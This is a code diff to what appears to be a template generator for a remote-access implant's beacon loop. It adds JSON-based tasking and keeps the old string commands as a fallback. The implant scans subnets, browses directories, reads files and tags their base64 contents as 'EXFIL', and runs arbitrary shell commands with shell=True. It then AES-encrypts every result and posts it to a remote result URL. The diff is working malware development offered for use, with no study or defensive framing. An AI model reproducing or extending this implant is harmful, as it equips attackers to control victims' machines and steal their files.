@@ -136,10 +136,16 @@ def {beacon_func}():
                 for {cmd_var} in {task_var}:
                     print(f"[+] Executing: {{{{ {cmd_var} }}}}")
 
-                    if {cmd_var}.startswith("scan "):
-                        parts = {cmd_var}.split("ports:")
-                        target_subnet = parts[0].replace("scan", "").strip()
-                        ports = [int(p) for p in parts[1].split(",")]
+                    try:
+                        task_json = json.loads({cmd_var})
+                        action = task_json.get("action", None)
+                    except Exception:
+                        task_json = None
+                        action = None
+
+                    if action == "scan":
+                        target_subnet = task_json.get("subnet", "")
+                        ports = task_json.get("ports", [])
                         scan_results = scan_network(target_subnet, ports)
 
                         {result_obj} = {{
@@ -151,8 +157,8 @@ def {beacon_func}():
                         requests.post(RESULT_URL, data={encrypted_result}.encode())
                         continue
 
-                    if {cmd_var}.startswith("getfile "):
-                        {file_path} = {cmd_var}.split(" ", 1)[1]
+                    if action == "getfile":
+                        {file_path} = task_json.get("path", "")
                         try:
                             with open({file_path}, "rb") as f:
                                 {b64data} = base64.b64encode(f.read()).decode()
@@ -160,16 +166,54 @@ def {beacon_func}():
                         except Exception as e:
                             {result_var} = f"[!] Failed to read file: {{e}}"
 
-                    elif {cmd_var}.startswith("browse "):
-                        path = {cmd_var}[7:].strip()
+                    elif action == "browse":
+                        path = task_json.get("path", "/" if os.name != 'nt' else r"C:\")
                         {result_var} = handle_browse(path)
 
-                    else:
+                    elif action == "shell":
+                        command = task_json.get("command", "")
                         try:
-                            {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
+                            {out_var} = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
                             {result_var} = {out_var}.decode().strip()
                         except subprocess.CalledProcessError as e:
                             {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
+
+                    else:
+                        # Backward compatibility: treat as string commands if not valid JSON
+                        if {cmd_var}.startswith("scan "):
+                            parts = {cmd_var}.split("ports:")
+                            target_subnet = parts[0].replace("scan", "").strip()
+                            ports = [int(p) for p in parts[1].split(",")]
+                            scan_results = scan_network(target_subnet, ports)
+
+                            {result_obj} = {{
+                                "hostname": {host_var},
+                                "command": {cmd_var},
+                                "result": scan_results
+                            }}
+                            {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
+                            requests.post(RESULT_URL, data={encrypted_result}.encode())
+                            continue
+
+                        if {cmd_var}.startswith("getfile "):
+                            {file_path} = {cmd_var}.split(" ", 1)[1]
+                            try:
+                                with open({file_path}, "rb") as f:
+                                    {b64data} = base64.b64encode(f.read()).decode()
+                                {result_var} = f"[EXFIL:{{{{ {file_path} }}}}]\\n{{{{ {b64data} }}}}"
+                            except Exception as e:
+                                {result_var} = f"[!] Failed to read file: {{e}}"
+
+                        elif {cmd_var}.startswith("browse "):
+                            path = {cmd_var}[7:].strip()
+                            {result_var} = handle_browse(path)
+
+                        else:
+                            try:
+                                {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
+                                {result_var} = {out_var}.decode().strip()
+                            except subprocess.CalledProcessError as e:
+                                {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
                     print(f"[>] Sending result:\\n{{{{ {result_var} }}}}")
 
@@ -180,6 +224,7 @@ def {beacon_func}():
                     }}
                     {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                     requests.post(RESULT_URL, data={encrypted_result}.encode())
+
 
         except Exception as e:
             print(f"[!] Beacon failed: {{e}}")
